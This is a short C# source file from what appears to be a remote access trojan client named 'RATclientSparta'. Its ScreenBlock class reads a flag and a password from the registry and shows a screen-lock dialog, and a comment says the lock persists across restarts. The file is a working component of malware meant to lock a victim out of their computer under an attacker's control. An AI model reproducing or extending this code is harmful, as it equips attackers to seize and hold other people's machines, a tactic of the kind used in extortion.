﻿using RATclientSparta.Setup.RegistryData;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RATclientSparta.Tools.Screen
{
    public class ScreenBlock
    {
        public void CheckIfLockRequired()
        {
            //Feature that locks the computer, Its using registry, So it will work even after computer restart.
            if (RegistryCheck.CheckIfExist("ScreenLock"))
            {
                //Decoding the password
                string password = RegistryGet.Get(@"HKEY_CURRENT_USER\Software\ClientValues", "ScreenLock");
                ScreenLock ScreenLock = new ScreenLock(password);
                ScreenLock.ShowDialog();
            }
        }
    }
}
